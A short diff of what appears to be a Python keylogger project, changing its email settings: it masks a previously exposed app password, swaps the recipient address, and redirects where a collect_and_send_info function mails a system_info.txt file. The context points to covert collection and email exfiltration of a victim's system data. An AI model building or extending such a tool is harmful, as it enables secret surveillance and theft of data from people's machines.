@@ -43,9 +43,9 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 email_address = ("abc@gmail.com")
-password = ("llry gujd xclh gamt")
+password = ("*** *** ***")
 
-toaddr = "abc@gmail.com"
+toaddr = "xyz@gmail.com"
 
 file_path = r"C:\Users\LENOVO\PycharmProjects\PythonProject\keylogger"
 extend = "\\"
@@ -232,4 +232,4 @@ def collect_and_send_info():
         f.write(system_info)
 
     # Send system_info.txt via email
-    send_email("system_info.txt", "system_info.txt", "wonlypans@gmail.com")
+    send_email("system_info.txt", "system_info.txt", "abc@gmail.com")
